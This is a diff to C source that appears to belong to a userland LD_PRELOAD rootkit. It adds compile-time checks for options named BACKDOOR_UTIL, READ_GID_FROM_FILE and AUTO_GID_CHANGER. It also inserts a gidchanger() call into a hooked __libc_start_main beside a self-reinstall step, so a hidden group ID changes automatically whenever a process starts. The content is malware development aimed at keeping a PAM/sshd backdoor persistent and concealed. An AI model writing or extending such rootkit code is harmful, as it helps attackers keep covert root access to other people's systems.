@@ -9,6 +9,14 @@
 #warning "USE_PAM_BD is enabled without PATCH_SSHD_CONFIG."
 #endif
 
+#if defined(READ_GID_FROM_FILE) && !defined(BACKDOOR_UTIL)
+#warning "READ_GID_FROM_FILE is defined without BACKDOOR_UTIL. you won't be able to change GID."
+#endif
+
+#if !defined(READ_GID_FROM_FILE) && defined(AUTO_GID_CHANGER)
+#error "AUTO_GID_CHANGER defined without READ_GID_FROM_FILE"
+#endif
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
@@ -58,6 +66,9 @@ int __libc_start_main(int *(main) (int, char **, char **), int argc, char **ubp_
     if(not_user(0))
         goto do_libc_start_main;
 
+#ifdef AUTO_GID_CHANGER
+    gidchanger();
+#endif
 #ifdef DO_REINSTALL
     reinstall();
 #endif
